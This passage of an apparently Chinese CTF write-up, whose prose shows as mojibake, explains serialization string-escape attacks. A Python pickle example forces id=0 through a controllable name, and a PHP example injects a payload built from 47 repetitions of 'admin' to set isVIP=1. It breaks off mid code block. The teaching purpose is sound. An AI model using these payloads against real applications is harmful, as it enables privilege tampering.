<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nx">app</span><span class="o">.</span><span class="nx">route</span><span class="p">(</span><span class="s2">&#34;/change&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">change_name</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span> <span class="o">=</span> <span class="nx">base64</span><span class="o">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nx">newname</span> <span class="o">=</span> <span class="nx">base64</span><span class="o">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;newname&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">file</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="nx">name</span><span class="o">.</span><span class="nx">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">info</span> <span class="o">=</span> <span class="nx">file</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;old_info ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="nx">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;name ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;newname ====================&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="nx">newname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">info</span> <span class="o">=</span> <span class="nx">info</span><span class="o">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">newname</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="nx">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file</span><span class="o">.</span><span class="nx">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">with</span> <span class="nx">open</span><span class="p">(</span><span class="nx">name</span><span class="o">.</span><span class="nx">decode</span><span class="p">()</span><span class="o">+</span> <span class="s2">&#34;_info&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="nx">f</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span><span class="o">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;success&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ®µä»£ç ï¼Œæˆ‘ä»¬nameçš„å€¼æ˜¯å¯æ§çš„ï¼Œå¯ä»¥å…ˆæœ¬åœ°è·‘ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå‘ç°ã€‚</p>
<p>æœ¬åœ°è¿è¡Œï¼Œå¹¶ä¸”/?name=123ï¼Œå‘ç°ç”Ÿæˆäº†123_infoæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ccopy_reg
</span></span><span class="line"><span class="cl">_reconstructor
</span></span><span class="line"><span class="cl">(c__main__
</span></span><span class="line"><span class="cl">Rookie
</span></span><span class="line"><span class="cl">c__builtin__
</span></span><span class="line"><span class="cl">object
</span></span><span class="line"><span class="cl">NtR(dVname
</span></span><span class="line"><span class="cl">V123
</span></span><span class="line"><span class="cl">sVid
</span></span><span class="line"><span class="cl">I2
</span></span><span class="line"><span class="cl">sb.
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å¯ä»¥çœ‹åˆ°I2ï¼Œåº”è¯¥æ˜¯id=2ï¼Œ
</span></span><span class="line"><span class="cl">sb.å¯ç›¸å½“äºç»“æŸåºåˆ—åŒ–æµç¨‹çš„ä¸€ä¸ªæ ‡å¿—ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™é‡Œè”æƒ³åˆ°phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚
</span></span><span class="line"><span class="cl">sb.å°±ç±»ä¼¼äº;}ï¼Œnameå°±æ˜¯æˆ‘ä»¬çš„å¯æ§å˜é‡ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æˆ‘ä»¬çš„ç›®æ ‡æ˜¯id=0ï¼Œè¿™é‡Œéœ€è¦è¢«ä¸¢å¼ƒçš„ä¸º
</span></span><span class="line"><span class="cl">sVid
</span></span><span class="line"><span class="cl">I2
</span></span><span class="line"><span class="cl">sb.
</span></span><span class="line"><span class="cl">é‚£ä¹ˆnameçš„å€¼å°±è¯¥ä¸º
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">sVid
</span></span><span class="line"><span class="cl">I0
</span></span><span class="line"><span class="cl">sb.
</span></span><span class="line"><span class="cl">è¿™æ ·æ„é€ ï¼Œç›¸å½“äºé—´æ¥æ›´æ”¹äº†idçš„å€¼ã€‚é‚£ä¹ˆç›´æ¥åœ¨/changeè·¯ç”±å¯¹nameè¿›è¡Œæ”¹å€¼å°±å¯ä»¥å•¦ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®˜æ–¹wpä¹Ÿæœ‰ä¸€ä¸ªæ€è·¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è§‚å¯Ÿidä¸º0å’Œ1çš„åºåˆ—åŒ–å­—èŠ‚æœ‰ä»€ä¹ˆä¸åŒ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print(pickletools.optimize(pickle.dumps(Rookie(&#34;aaa&#34;,0),protocol=0)))
</span></span><span class="line"><span class="cl">print(pickletools.optimize(pickle.dumps(Rookie(&#34;aaa&#34;,1),protocol=0)))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">b&#39;ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVaaa\nsVid\nI0\nsb.&#39;
</span></span><span class="line"><span class="cl">b&#39;ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVaaa\nsVid\nI1\nsb.&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä»è€Œå¯ä»¥æƒ³åˆ°åˆ©ç”¨phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„åšæ³•ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="çŸ¥è¯†ç‚¹-1">çŸ¥è¯†ç‚¹</h4>
<h5 id="phpååºåˆ—åŒ–ç‰¹ç‚¹">phpååºåˆ—åŒ–ç‰¹ç‚¹</h5>
<ul>
<li>phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ } ä½œä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ– ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å¹¶ä¸ä¼šè¢«ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™è¯´æ˜ååºåˆ—åŒ–çš„è¿‡ç¨‹æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€‚ååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥&quot;;}ç»“æŸï¼Œå¦‚æœæŠŠ&quot;;}æ·»å…¥åˆ°éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ä¼šä¸¢å¼ƒã€‚</li>
<li>é•¿åº¦ä¸å¯¹åº”ä¼šæŠ¥é”™ã€‚</li>
</ul>
<h5 id="phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸">PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h5>
<ul>
<li>
<p><strong>æ¼æ´æˆå› </strong>ï¼šä»£ç ä¸­å­˜åœ¨é’ˆå¯¹åºåˆ—åŒ–ï¼ˆserialize()ï¼‰åçš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤æ“ä½œï¼ˆå˜å¤šæˆ–è€…å˜å°‘ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ¼æ´æ¡ä»¶</strong>ï¼šåºåˆ—åŒ–åè¿‡æ»¤å†è¿›è¡Œååºåˆ—åŒ–</p>
</li>
<li>
<p><strong>ä¸¤ç§æƒ…å†µ</strong>ï¼šè¿‡æ»¤åå­—ç¬¦å˜å¤šã€è¿‡æ»¤åå­—ç¬¦å˜å°‘</p>
</li>
<li>
<p><strong>äºŒè€…åŒºåˆ«</strong>ï¼š</p>
<p>å­—ç¬¦ä¸²å¢åŠ ï¼šæ„é€ çš„åºåˆ—åŒ–è¯­å¥å’Œè¿‡æ»¤çš„å€¼åœ¨åŒä¸€ä¸ªå˜é‡
å­—ç¬¦ä¸²å‡å°‘ï¼šæ„é€ çš„åºåˆ—åŒ–è¯­å¥å’Œè¿‡æ»¤çš„å€¼ä¸åœ¨åŒä¸ªå˜é‡é‡Œ
å­—ç¬¦ä¸²å¢åŠ ï¼šæ„é€ è¿‡æ»¤çš„å€¼çš„ä¸ªæ•°å°±æ˜¯æ„é€ çš„åºåˆ—åŒ–è¯­å¥çš„å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸ªæ•°
å­—ç¬¦ä¸²å‡å°‘ï¼šæ„é€ è¿‡æ»¤çš„å€¼çš„ä¸ªæ•°æ˜¯ä¸‹ä¸€ä¸ªå¯æ§å˜é‡çš„å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸ªæ•°</p>
</li>
</ul>
<h5 id="å­—ç¬¦ä¸²å¢åŠ å®ä¾‹">å­—ç¬¦ä¸²å¢åŠ å®ä¾‹</h5>
<p>ç›®æ ‡ï¼šå°†isVIPå˜é‡çš„å€¼ä¿®æ”¹ä¸º1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;123456&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¢åŠ ä¸€ä¸ªå¯¹adminå­—ç¬¦è¿›è¡Œæ›¿æ¢çš„å‡½æ•°ï¼Œå°†adminæ›¿æ¢ä¸ºhacker</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hacker&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;123456&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;hacker&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}  // æœªè¿‡æ»¤
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;hacker&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;} // å·²è¿‡æ»¤
</span></span><span class="line"><span class="cl">å·²è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„hackerä¸å‰é¢çš„å­—ç¬¦é•¿åº¦ä¸å¯¹åº”ï¼Œæ­¤æ—¶ï¼Œæ–°å»ºå¯¹è±¡ï¼Œåˆ™ä¼ å…¥çš„adminå°±æ˜¯å¯æ§å˜é‡
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›®æ ‡å­—ä¸²å’Œç°æœ‰å­—ä¸²æ¯”è¾ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}	// ç°æœ‰å­ä¸²
</span></span><span class="line"><span class="cl">&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}	// ç›®æ ‡å­ä¸²ï¼Œé•¿åº¦ä¸º47
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">éœ€è¦åœ¨adminè¿™ä¸ªå¯æ§å˜é‡çš„ä½ç½®ï¼Œæ³¨å…¥ç›®æ ‡å­ä¸²ã€‚å› ä¸ºéœ€è¦é€ƒé€¸çš„ç›®æ ‡å­—ä¸²é•¿åº¦ä¸º47ï¼Œå¹¶ä¸”adminæ¯æ¬¡è¿‡æ»¤åéƒ½ä¼šå˜æˆhackerï¼Œå³æ¯å‡ºç°ä¸€æ¬¡adminï¼Œå°±ä¼šå¤š1ä¸ªå­—ç¬¦ã€‚å› æ­¤éœ€è¦åœ¨å¯æ§å˜é‡å¤„é‡å¤47éadminï¼Œå¹¶åŠ ä¸Šé€ƒé€¸åçš„ç›®æ ‡å­ä¸²ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hacker&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#39;</span><span class="p">,</span><span class="s1">&#39;123456&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:282:&#34;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä¸€å…±æ˜¯47ä¸ªhackerï¼Œå…±282ä¸ªå­—ç¬¦ï¼Œæ­£å¥½ä¸å‰é¢282ç›¸å¯¹åº”ï¼Œåé¢çš„æ³¨å…¥å­ä¸²ä¹Ÿå®Œæˆäº†é€ƒé€¸ã€‚ååºåˆ—åŒ–åï¼Œæœ€åé¢çš„å¤šä½™å­ä¸²ç›´æ¥æŠ›å¼ƒã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†åºåˆ—åŒ–ç»“æœå†ååºåˆ—åŒ–ä¹‹åï¼Œè¾“å‡ºæ£€æŸ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
